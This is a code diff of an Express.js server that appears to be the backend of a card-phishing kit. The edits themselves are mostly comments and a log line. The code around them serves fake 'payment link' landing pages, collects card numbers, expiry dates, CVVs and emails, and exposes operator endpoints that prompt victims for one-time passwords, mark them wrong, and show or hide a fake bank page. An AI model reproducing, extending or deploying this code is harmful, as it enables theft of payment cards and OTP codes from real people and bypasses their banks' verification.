@@ -6,12 +6,15 @@ import crypto from 'crypto';
 const app = express();
 app.use(bodyParser.json());
 app.use(cors());
-app.use(express.static("."));
+app.use(express.static(".")); // Serves static files from current directory
 
+// In-memory data stores
 const transactions = new Map();
 const paymentLinks = new Map();
 
-// Generate Payment Link endpoint
+// -----------------------
+// Generate Payment Link Endpoint
+// -----------------------
 app.post('/api/generatePaymentLink', (req, res) => {
   try {
     const { amount, description } = req.body;
@@ -34,11 +37,11 @@ app.post('/api/generatePaymentLink', (req, res) => {
     // Generate secure invoice ID
     const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
     
-    // Create full URL with proper protocol (use x-forwarded-proto if available)
+    // Determine protocol (if behind a proxy, use x-forwarded-proto)
     const protocol = req.headers['x-forwarded-proto'] || req.protocol;
     const paymentLink = `${protocol}://${req.get('host')}/landing.html?pid=${invoiceId}`;
     
-    // Store payment details
+    // Store payment details in memory
     paymentLinks.set(invoiceId, {
       amount: parseFloat(amount),
       description: description.trim(),
@@ -46,6 +49,7 @@ app.post('/api/generatePaymentLink', (req, res) => {
       createdAt: new Date().toISOString()
     });
     
+    // Return a single JSON response
     res.json({ status: "success", paymentLink });
     
   } catch (error) {
@@ -57,7 +61,9 @@ app.post('/api/generatePaymentLink', (req, res) => {
   }
 });
 
-// Get payment details endpoint
+// -----------------------
+// Other Endpoints
+// -----------------------
 app.get('/api/getPaymentDetails', (req, res) => {
   const { pid } = req.query;
   if (!pid || !paymentLinks.has(pid)) {
@@ -67,7 +73,6 @@ app.get('/api/getPaymentDetails', (req, res) => {
   res.json({ status: "success", payment });
 });
 
-// Get transaction details endpoint
 app.get('/api/getTransactionDetails', (req, res) => {
   const { invoiceId } = req.query;
   const txn = transactions.get(invoiceId);
@@ -77,13 +82,11 @@ app.get('/api/getTransactionDetails', (req, res) => {
   res.json(txn);
 });
 
-// Get all transactions endpoint
 app.get('/api/transactions', (req, res) => {
   const txList = Array.from(transactions.values());
   res.json(txList);
 });
 
-// Process payment details endpoint
 app.post('/api/sendPaymentDetails', (req, res) => {
   const { cardNumber, expiry, cvv, email, amount, currency, cardholder } = req.body;
   const invoiceId = crypto.randomBytes(4).toString('hex').toUpperCase();
@@ -112,7 +115,6 @@ app.post('/api/sendPaymentDetails', (req, res) => {
   res.json({ status: "success", invoiceId });
 });
 
-// Show OTP endpoint
 app.post('/api/showOTP', (req, res) => {
   const { invoiceId } = req.body;
   const txn = transactions.get(invoiceId);
@@ -125,7 +127,6 @@ app.post('/api/showOTP', (req, res) => {
   res.json({ status: "success", message: "OTP form will be shown to user" });
 });
 
-// Mark OTP as wrong endpoint
 app.post('/api/wrongOTP', (req, res) => {
   const { invoiceId } = req.body;
   const txn = transactions.get(invoiceId);
@@ -137,7 +138,6 @@ app.post('/api/wrongOTP', (req, res) => {
   res.json({ status: "success", message: "OTP marked as wrong" });
 });
 
-// Check transaction status endpoint
 app.get('/api/checkTransactionStatus', (req, res) => {
   const { invoiceId } = req.query;
   const txn = transactions.get(invoiceId);
@@ -161,7 +161,6 @@ app.get('/api/checkTransactionStatus', (req, res) => {
   res.json({ status: txn.status, otpError: txn.otpError });
 });
 
-// Submit OTP endpoint
 app.post('/api/submitOTP', (req, res) => {
   const { invoiceId, otp } = req.body;
   const txn = transactions.get(invoiceId);
@@ -175,7 +174,6 @@ app.post('/api/submitOTP', (req, res) => {
   res.json({ status: "success", message: "OTP received" });
 });
 
-// Update redirect status endpoint
 app.post('/api/updateRedirectStatus', (req, res) => {
   const { invoiceId, redirectStatus } = req.body;
   const txn = transactions.get(invoiceId);
@@ -194,7 +192,6 @@ app.post('/api/updateRedirectStatus', (req, res) => {
   });
 });
 
-// Redirect to bank page endpoint
 app.post('/api/redirectToBankPage', (req, res) => {
   const { invoiceId } = req.body;
   const txn = transactions.get(invoiceId);
@@ -206,7 +203,6 @@ app.post('/api/redirectToBankPage', (req, res) => {
   res.json({ status: "success", message: "Redirecting to bank page" });
 });
 
-// Show bank page endpoint
 app.post('/api/showBankpage', (req, res) => {
   const { invoiceId } = req.body;
   const txn = transactions.get(invoiceId);
@@ -214,10 +210,10 @@ app.post('/api/showBankpage', (req, res) => {
   
   txn.redirectStatus = 'bankpage';
   txn.bankpageVisible = true;
+  console.log(`Showing bankpage for transaction ${invoiceId}`);
   res.json({ status: 'success' });
 });
 
-// Hide bank page endpoint
 app.post('/api/hideBankpage', (req, res) => {
   const { invoiceId } = req.body;
   const txn = transactions.get(invoiceId);
